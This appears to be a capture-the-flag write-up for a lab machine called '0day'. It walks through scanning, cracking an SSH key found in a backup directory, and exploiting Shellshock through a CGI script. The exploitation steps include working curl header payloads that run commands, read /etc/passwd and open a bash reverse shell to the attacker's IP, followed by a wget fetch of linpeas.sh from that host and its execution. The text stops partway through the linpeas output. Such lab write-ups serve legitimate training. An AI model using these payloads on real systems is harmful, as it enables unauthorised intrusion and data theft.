---
Exploit Ubuntu, like a Turtle in a Hurricane
---

# 0day — Writeup

## Overview
### 0day — Writeup
Flags
Start Machine
Root my secure Website, take a step into the history of hacking.
![222](https://i.imgur.com/qnt7Eym.png)
Answer the questions below

## Enumeration
```text
┌──(kali㉿kali)-[~/ra]
└─$ rustscan -a 10.10.114.218 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.114.218:22
Open 10.10.114.218:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-07 10:31 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:31
Completed NSE at 10:31, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:31
Completed NSE at 10:31, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:31
Completed NSE at 10:31, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 10:31
Completed Parallel DNS resolution of 1 host. at 10:31, 0.02s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 10:31
Scanning 10.10.114.218 [2 ports]
Discovered open port 80/tcp on 10.10.114.218
Discovered open port 22/tcp on 10.10.114.218
Completed Connect Scan at 10:31, 0.19s elapsed (2 total ports)
Initiating Service scan at 10:31
Scanning 2 services on 10.10.114.218
Completed Service scan at 10:31, 6.39s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.114.218.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:31
Completed NSE at 10:31, 6.01s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:31
Completed NSE at 10:31, 0.77s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:31
Completed NSE at 10:31, 0.00s elapsed
Nmap scan report for 10.10.114.218
Host is up, received user-set (0.18s latency).
Scanned at 2023-01-07 10:31:08 EST for 14s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 5720823c62aa8f4223c0b893996f499c (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAPcMQIfRe52VJuHcnjPyvMcVKYWsaPnADsmH+FR4OyR5lMSURXSzS15nxjcXEd3i9jk14amEDTZr1zsapV1Ke2Of/n6V5KYoB7p7w0HnFuMriUSWStmwRZCjkO/LQJkMgrlz1zVjrDEANm3fwjg0I7Ht1/gOeZYEtIl9DRqRzc1ZAAAAFQChwhLtInglVHlWwgAYbni33wUAfwAAAIAcFv6QZL7T2NzBsBuq0RtlFux0SAPYY2l+PwHZQMtRYko94NUv/XUaSN9dPrVKdbDk4ZeTHWO5H6P0t8LruN/18iPqvz0OKHQCgc50zE0pTDTS+GdO4kp3CBSumqsYc4nZsK+lyuUmeEPGKmcU6zlT03oARnYA6wozFZggJCUG4QAAAIBQKMkRtPhl3pXLhXzzlSJsbmwY6bNRTbJebGBx6VNSV3imwPXLR8VYEmw3O2Zpdei6qQlt6f2S3GaSSUBXe78h000/JdckRk6A73LFUxSYdXl1wCiz0TltSogHGYV9CxHDUHAvfIs5QwRAYVkmMe2H+HSBc3tKeHJEECNkqM2Qiw==
|   2048 4c40db32640d110cef4fb85b739bc76b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwY8CfRqdJ+C17QnSu2hTDhmFODmq1UTBu3ctj47tH/uBpRBCTvput1+++BhyvexQbNZ6zKL1MeDq0bVAGlWZrHdw73LCSA1e6GrGieXnbLbuRm3bfdBWc4CGPItmRHzw5dc2MwO492ps0B7vdxz3N38aUbbvcNOmNJjEWsS86E25LIvCqY3txD+Qrv8+W+Hqi9ysbeitb5MNwd/4iy21qwtagdi1DMjuo0dckzvcYqZCT7DaToBTT77Jlxj23mlbDAcSrb4uVCE538BGyiQ2wgXYhXpGKdtpnJEhSYISd7dqm6pnEkJXSwoDnSbUiMCT+ya7yhcNYW3SKYxUTQzIV
|   256 f76f78d58352a64dda213c5547b72d6d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKF5YbiHxYqQ7XbHoh600yn8M69wYPnLVAb4lEASOGH6l7+irKU5qraViqgVR06I8kRznLAOw6bqO2EqB8EBx+E=
|   256 a5b4f084b6a78deb0a9d3e7437336516 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIItaO2Q/3nOu5T16taNBbx5NqcWNAbOkTZHD2TB1FcVg
80/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
|_http-title: 0day
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.7 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:31
Completed NSE at 10:31, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:31
Completed NSE at 10:31, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:31
Completed NSE at 10:31, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.77 seconds
```
```text
┌──(kali㉿kali)-[~/ra]
└─$ gobuster dir -u http://10.10.114.218 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -k -x txt,php,py,html
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.114.218
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              php,py,html,txt
[+] Timeout:                 10s
===============================================================
2023/01/07 10:42:35 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 285]
/index.html           (Status: 200) [Size: 3025]
/cgi-bin              (Status: 301) [Size: 315] [--> http://10.10.114.218/cgi-bin/]
/img                  (Status: 301) [Size: 311] [--> http://10.10.114.218/img/]
/uploads              (Status: 301) [Size: 315] [--> http://10.10.114.218/uploads/]
/admin                (Status: 301) [Size: 313] [--> http://10.10.114.218/admin/]
/css                  (Status: 301) [Size: 311] [--> http://10.10.114.218/css/]
/js                   (Status: 301) [Size: 310] [--> http://10.10.114.218/js/]
/backup               (Status: 301) [Size: 314] [--> http://10.10.114.218/backup/]
/robots.txt           (Status: 200) [Size: 38]
/secret               (Status: 301) [Size: 314] [--> http://10.10.114.218/secret/]

view-source:http://10.10.114.218/backup/

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
-----END RSA PRIVATE KEY-----

http://10.10.114.218/secret/
```

## Exploitation
```text
┌──(kali㉿kali)-[~/0day_ctf]
└─$ ssh2john id_rsa > hash
```
```text
┌──(kali㉿kali)-[~/0day_ctf]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash      
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
No password hashes left to crack (see FAQ)
```
```text
┌──(kali㉿kali)-[~/0day_ctf]
└─$ john hash --show  
id_rsa:letmein

1 password hash cracked, 0 left

a turtle (stego?)
```
```text
┌──(kali㉿kali)-[~/snort]
└─$ ls
brooklyn99.jpg  hash.txt  passwd.txt  shadow.txt  SnortCheatsheetTryHackMe.pdf  traffic-generator.sh  turtle.png
```
```text
┌──(kali㉿kali)-[~/snort]
└─$ mv turtle.png ../0day_ctf
```
```text
┌──(kali㉿kali)-[~/0day_ctf]
└─$ file turtle.png                   
turtle.png: PNG image data, 680 x 340, 8-bit/color RGBA, non-interlaced
```
```text
┌──(kali㉿kali)-[~/0day_ctf]
└─$ nikto -h 10.10.114.218
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.114.218
+ Target Hostname:    10.10.114.218
+ Target Port:        80
+ Start Time:         2023-01-07 10:53:01 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Server may leak inodes via ETags, header found with file /, inode: bd1, size: 5ae57bb9a1192, mtime: gzip
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Uncommon header '93e4r0-cve-2014-6278' found, with contents: true
+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /backup/: This might be interesting...
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3092: /secret/: This might be interesting...
+ OSVDB-3092: /cgi-bin/test.cgi: This might be interesting...

Shellshock (https://www.sevenlayers.com/index.php/blog/125-exploiting-shellshock)

Shellshock es una vulnerabilidad grave en el intérprete de comandos Bash que afecta a muchos sistemas operativos, incluyendo Linux y Mac OS X. La vulnerabilidad permite a un atacante ejecutar código arbitrario en el sistema afectado simplemente enviando una solicitud especialmente diseñada a un programa que use Bash.

Un ejemplo de cómo explotar la vulnerabilidad podría ser el siguiente: supongamos que un sitio web tiene un formulario en el que los usuarios pueden ingresar una dirección de correo electrónico para recibir un mensaje de confirmación. Si un atacante envía una solicitud con un campo de dirección de correo electrónico especialmente diseñado (que incluye código Bash), ese código puede ser ejecutado por el sistema del sitio web. De esta manera, el atacante podría, por ejemplo, obtener acceso no autorizado a archivos sensibles del sistema.

Es importante mencionar que la vulnerabilidad Shellshock fue corregida hace tiempo, por lo que es poco probable que un sistema actualmente soportado todavía sea vulnerable. Sin embargo, es importante asegurarse de mantener actualizados todos los sistemas y programas para protegerse contra vulnerabilidades similares en el futuro.

testing

1.  Primero, se define una variable de shell llamada "x" y se le asigna un valor. El valor de la variable es el siguiente: '() { :;}; echo VULNERABLE'
    
2.  El valor de la variable comienza con un par de paréntesis vacíos seguidos de un espacio y una llave. Esto indica el inicio de una función de Bash.
    
3.  Dentro de la función se define una etiqueta de fin de línea (:) seguida de una llave y un punto y coma (;). Esto es una función vacía, es decir, no hace nada. La etiqueta de fin de línea es importante porque indica el final de la función y permite que Bash interprete el resto del código como una serie de comandos sueltos en lugar de como una función.
    
4.  Después de la función vacía viene una llave y un punto y coma (;}). Esto indica el final de la función.
    
5.  Luego viene la instrucción "echo VULNERABLE". Esta instrucción muestra el mensaje "VULNERABLE" en la salida. El mensaje "VULNERABLE" es simplemente un ejemplo de cómo un atacante podría utilizar la vulnerabilidad Shellshock para ejecutar código malicioso. En lugar de "echo VULNERABLE", el atacante podría escribir cualquier otro comando que desee ejecutar en el sistema afectado.
    
6.  Por último, se utiliza el comando "bash -c" para ejecutar el valor de la variable "x", es decir, el bloque de código malicioso. "bash -c" ejecuta una cadena de comandos especificada como argumento. En este caso, el argumento es el valor de la variable "x", que incluye el bloque de código malicioso. Si el sistema es vulnerable a Shellshock, el código malicioso será ejecutado y se mostrará el mensaje "VULNERABLE".
```
```text
┌──(kali㉿kali)-[~/0day_ctf]
└─$ x='() { :;}; echo VULNERABLE' bash -c : 

http://10.10.249.163/cgi-bin/test.cgi

Hello World! 

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi

cgi-bin is a directory on a web server that is used to store Common Gateway Interface (CGI) scripts. These scripts are executed by the web server when a user requests a particular URL or web page that is associated with the script. The test.cgi file you mentioned is likely a CGI script written in a programming language such as Perl, Python, or C. It is executed by the web server when a user requests a web page or URL that is associated with the script. The purpose and functionality of the script will depend on the code that has been written by the script's creator.
```
```text
┌──(kali㉿kali)-[~/0day_ctf]
└─$ curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://10.10.249.163/cgi-bin/test.cgi

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
```text
┌──(kali㉿kali)-[~/0day_ctf]
└─$ chmod 600 id_rsa
```
```text
┌──(kali㉿kali)-[~/0day_ctf]
└─$ ssh -i id_rsa www-data@10.10.249.163
Enter passphrase for key 'id_rsa': 
sign_and_send_pubkey: no mutual signature supported
www-data@10.10.249.163's password: 
Permission denied, please try again.
```
```text
┌──(kali㉿kali)-[~/0day_ctf]
└─$ curl --help | grep "\-A"
 -A, --user-agent <name>    Send User-Agent <name> to server
```
```text
┌──(kali㉿kali)-[~/0day_ctf]
└─$ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.10.249.163/cgi-bin/test.cgi 

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
ryan:x:1000:1000:Ubuntu 14.04.1,,,:/home/ryan:/bin/bash
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin

revshell
```
```text
┌──(kali㉿kali)-[~/0day_ctf]
└─$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.8.19.103/1234 0>&1' http://10.10.249.163/cgi-bin/test.cgi
```
```text
┌──(kali㉿kali)-[~/0day_ctf]
└─$ rlwrap nc -lnvp 1234  
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.249.163.
Ncat: Connection from 10.10.249.163:33391.
bash: cannot set terminal process group (878): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/usr/lib/cgi-bin$ whoami
whoami
www-data
www-data@ubuntu:/usr/lib/cgi-bin$ find / -type f -name flag.txt 2>/dev/null
find / -type f -name flag.txt 2>/dev/null
www-data@ubuntu:/usr/lib/cgi-bin$ cd /home
cd /home
www-data@ubuntu:/home$ ls
ls
ryan
www-data@ubuntu:/home$ cd ryan
cd ryan
www-data@ubuntu:/home/ryan$ ls
ls
user.txt
www-data@ubuntu:/home/ryan$ cat user.txt
cat user.txt
THM{Sh3llSh0ck_r0ckz}

www-data@ubuntu:/home/ryan$ which python3
which python3
/usr/bin/python3
www-data@ubuntu:/home/ryan$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/home/ryan$ sudo -l
sudo -l
[sudo] password for www-data: letmein

Sorry, try again.
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: 

Sorry, try again.
sudo: 3 incorrect password attempts

www-data@ubuntu:/home/ryan$ find / -perm -4000 2>/dev/null | xargs ls -lah
find / -perm -4000 2>/dev/null | xargs ls -lah
-rwsr-xr-x 1 root    root        31K Dec 16  2013 /bin/fusermount
-rwsr-xr-x 1 root    root        93K Jun  3  2014 /bin/mount
-rwsr-xr-x 1 root    root        44K May  7  2014 /bin/ping
-rwsr-xr-x 1 root    root        44K May  7  2014 /bin/ping6
-rwsr-xr-x 1 root    root        37K Feb 16  2014 /bin/su
-rwsr-xr-x 1 root    root        68K Jun  3  2014 /bin/umount
-rwsr-xr-x 1 root    root        46K Feb 16  2014 /usr/bin/chfn
-rwsr-xr-x 1 root    root        41K Feb 16  2014 /usr/bin/chsh
-rwsr-xr-x 1 root    root        67K Feb 16  2014 /usr/bin/gpasswd
-rwsr-xr-x 1 root    root        74K Oct 21  2013 /usr/bin/mtr
-rwsr-xr-x 1 root    root        32K Feb 16  2014 /usr/bin/newgrp
-rwsr-xr-x 1 root    root        46K Feb 16  2014 /usr/bin/passwd
-rwsr-xr-x 1 root    root       152K Feb 10  2014 /usr/bin/sudo
-rwsr-xr-x 1 root    root        23K May  7  2014 /usr/bin/traceroute6.iputils
-rwsr-xr-- 1 root    messagebus 304K Jul  3  2014 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root    root        10K Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root    root       431K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root    root        11K Apr 12  2014 /usr/lib/pt_chown
-rwsr-xr-- 1 root    dip        336K Jan 22  2013 /usr/sbin/pppd
-rwsr-sr-x 1 libuuid libuuid     19K Jun  3  2014 /usr/sbin/uuidd
```

## Privilege Escalation
```text
┌──(kali㉿kali)-[~/0day_ctf]
└─$ cp /home/kali/Downloads/linpeas.sh linpeas.sh
```
```text
┌──(kali㉿kali)-[~/0day_ctf]
└─$ ls            
hash  id_rsa  linpeas.sh  turtle.png
```
```text
┌──(kali㉿kali)-[~/0day_ctf]
└─$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.10.249.163 - - [07/Jan/2023 22:43:23] "GET /linpeas.sh HTTP/1.1" 200 -

www-data@ubuntu:/tmp$ wget http://10.8.19.103:1337/linpeas.sh
wget http://10.8.19.103:1337/linpeas.sh
--2023-01-07 19:43:23--  http://10.8.19.103:1337/linpeas.sh
Connecting to 10.8.19.103:1337... connected.
HTTP request sent, awaiting response... 200 OK
Length: 777018 (759K) [text/x-sh]
Saving to: 'linpeas.sh'

100%[======================================>] 777,018      393KB/s   in 1.9s   

2023-01-07 19:43:25 (393 KB/s) - 'linpeas.sh' saved [777018/777018]

www-data@ubuntu:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh

www-data@ubuntu:/tmp$ ./linpeas.sh
./linpeas.sh

                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄                                                                               
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------\
    |                             Do you like PEASS?                            |                                                         
    |---------------------------------------------------------------------------|                                                         
    |         Get latest LinPEAS  :     https://github.com/sponsors/carlospolop |                                                         
    |         Follow on Twitter   :     @carlospolopm                           |                                                         
    |         Respect on HTB      :     SirBroccoli                             |                                                         
    |---------------------------------------------------------------------------|                                                         
    |                                 Thank you!                                |                                                         
    \---------------------------------------------------------------------------/                                                         
          linpeas-ng by carlospolop                                                                                                       
                                                                                                                                          
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                                                                    
                                                                                                                                          
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                                  
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Basic information ╠═════════════════════════════════════════                                   
                                         ╚═══════════════════╝                                                                            
OS: Linux version 3.13.0-32-generic (buildd@kissel) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: ubuntu
Writable folder: /run/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)             
                                                                                                                                          

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE                                    
                                                                                                                                          
                                        ╔════════════════════╗
════════════════════════════════════════╣ System Information ╠════════════════════════════════════════                                    
                                        ╚════════════════════╝                                                                            
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                        
Linux version 3.13.0-32-generic (buildd@kissel) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 
Distributor ID: Ubuntu
Description:    Ubuntu 14.04.1 LTS
Release:        14.04
Codename:       trusty

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                           
Sudo version 1.8.9p5                                                                                                                      

╔══════════╣ CVEs Check
./linpeas.sh: 1196: ./linpeas.sh: systemctl: not found
./linpeas.sh: 1197: ./linpeas.sh: [[: not found
./linpeas.sh: 1197: ./linpeas.sh: rpm: not found
./linpeas.sh: 1197: ./linpeas.sh: 0: not found
./linpeas.sh: 1207: ./linpeas.sh: [[: not found

╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                                   
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                              
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

╔══════════╣ Date & uptime
Sat Jan  7 19:44:03 PST 2023                                                                                                              
 19:44:03 up 33 min,  0 users,  load average: 0.00, 0.01, 0.05

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                      

╔══════════╣ Unmounted file-system?
╚ Check if you can mount unmounted devices                                                                                                
